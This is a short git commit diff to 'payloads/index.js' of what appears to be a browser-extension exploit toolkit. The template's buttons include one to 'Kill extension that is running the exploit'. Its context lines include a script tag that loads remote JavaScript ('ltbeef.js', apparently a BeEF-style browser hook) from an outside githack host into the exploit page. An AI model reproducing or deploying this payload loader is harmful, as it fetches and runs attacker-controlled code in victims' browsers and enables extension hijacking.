bf8d8323232da9b6dd4b3b78141d6a5a07f568a5
Universal UB <115511537+uniub@users.noreply.github.com>
2024-10-01 16:08:43 +0000

    added test script

--- payloads/index.js
+++ payloads/index.js
@@ -27,6 +27,7 @@ const managementTemplate = `
 <br>
 <button id="payload-5">P5 Kill extension that is running the exploit (WILL CLOSE THE TAB)</button>
 </div>
+Added test scripts.
 <script src=https://raw.githack.com/uniub/rigtools/main/ltbeef.js"></script>
 <script>window.alert("This is a test.")</script>
 
